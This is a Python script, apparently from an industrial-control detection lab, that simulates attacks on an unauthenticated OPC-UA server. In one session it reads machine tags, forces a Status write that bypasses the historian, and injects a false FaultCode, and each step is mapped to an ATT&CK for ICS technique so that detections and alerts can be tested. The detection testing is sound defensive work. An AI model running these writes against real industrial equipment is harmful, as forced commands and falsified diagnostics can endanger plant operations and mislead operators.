"""OPC-UA ICS attack simulator — triggers detection for OPC-UA Binary, which
has no authentication in this configuration (no username/password, no
certificates), so every technique below is just a normal client call aimed
at someone else's machine.

Malcolm's ACID package only has detection tables for S7comm/CIP/BACnet (see
reference_ot_ics_acid_triggers memory) — OPC-UA gets no free ACID technique
tags here, same gap as Modbus/DNP3/FINS. asyncua is a real, well-behaved async
library (unlike DNP3/FINS's hand-rolled protocols) — no known Zeek parser
quirks have been found for it. OPC-UA has its own custom OpenSearch Alerting
monitor + "OPC-UA Detection Overview" dashboard instead
(linux/configure_opcua_alerting), same pattern as Modbus/S7comm/BACnet/
EtherNet-IP/DNP3/FINS — verified live 2026-07-05: this shared-connection run
produces exactly 1 alert (all 3 techniques land in the same `zeek.uid`
session), correctly attributed, function codes fully populated (unlike
DNP3/FINS's empty-bucket gap there).

All three techniques run over ONE shared connection — unlike S7comm/BACnet/
DNP3's per-technique isolation, there's no established parser-desync risk for
OPC-UA here (asyncua/Zeek's OPC-UA analyzer, where present, hasn't shown the
same "unusual message desyncs the rest of the connection" issue found for
S7comm/BACnet), matching EtherNet/IP-CIP's simpler one-connection recon
sequence.

Three techniques, mapped to MITRE ATT&CK for ICS:
  T0846 Remote System Discovery — unauthenticated read of Speed/Status/
    FaultCode, no creds needed.
  T0855 Unauthorized Command Message — force Status=Running directly,
    bypassing the historian's own control entirely.
  T0836 Modify Parameter — inject a false FaultCode (the machine's actual
    run state is untouched; only the diagnostic data lies).

Usage:
    python3 opcua_attack.py --target 192.168.60.10
"""

from __future__ import annotations

import argparse
import asyncio
import logging

from asyncua import Client

log = logging.getLogger("opcua_attack")

NAMESPACE_URI = "http://example.org/ics-sim/machine"
OBJECT_NAME = "Machine1"
TAG_SPEED = "Speed"
TAG_STATUS = "Status"
TAG_FAULT_CODE = "FaultCode"


async def _find_nodes(client: Client):
    idx = await client.get_namespace_index(NAMESPACE_URI)
    machine = await client.get_objects_node().get_child([f"{idx}:{OBJECT_NAME}"])
    speed = await machine.get_child([f"{idx}:{TAG_SPEED}"])
    status = await machine.get_child([f"{idx}:{TAG_STATUS}"])
    fault = await machine.get_child([f"{idx}:{TAG_FAULT_CODE}"])
    return speed, status, fault


async def recon(client: Client) -> None:
    log.info("[T0846 Remote System Discovery] unauthenticated read of Speed/Status/FaultCode")
    speed_node, status_node, fault_node = await _find_nodes(client)
    log.info("Speed:      %.1f", await speed_node.get_value())
    log.info("Status:     %s", await status_node.get_value())
    log.info("FaultCode:  %d", await fault_node.get_value())
    log.info("(no credentials were required for any of this)")


async def force_status(client: Client, state: str = "Running") -> None:
    log.info("[T0855 Unauthorized Command Message] forcing Status=%s directly, bypassing the historian", state)
    _speed_node, status_node, _fault_node = await _find_nodes(client)
    await status_node.write_value(state)
    log.info("write accepted -- the machine is now %s regardless of what the historian commanded", state)


async def fake_fault(client: Client, code: int = 9999) -> None:
    log.info("[T0836 Modify Parameter] injecting a false FaultCode=%d", code)
    _speed_node, _status_node, fault_node = await _find_nodes(client)
    before = await fault_node.get_value()
    await fault_node.write_value(code)
    log.info("FaultCode %d -> %d -- machine's actual run state untouched, only diagnostics lied about", before, code)


async def attack(host: str, port: int) -> None:
    try:
        async with Client(url=f"opc.tcp://{host}:{port}/ics-sim/server/") as client:
            await recon(client)
            await force_status(client, "Running")
            await fake_fault(client, 9999)
    except Exception as exc:
        log.error("attack FAILED -- %s", exc)
        raise

    log.info("Attack sequence complete.")


def main() -> None:
    parser = argparse.ArgumentParser(description="OPC-UA ACID/ATT&CK ICS attack simulator")
    parser.add_argument("--target", required=True, help="OPC-UA server IP (e.g. 192.168.60.10)")
    parser.add_argument("--port", type=int, default=4840)
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
    logging.getLogger("asyncua").setLevel(logging.WARNING)
    asyncio.run(attack(args.target, args.port))


if __name__ == "__main__":
    main()
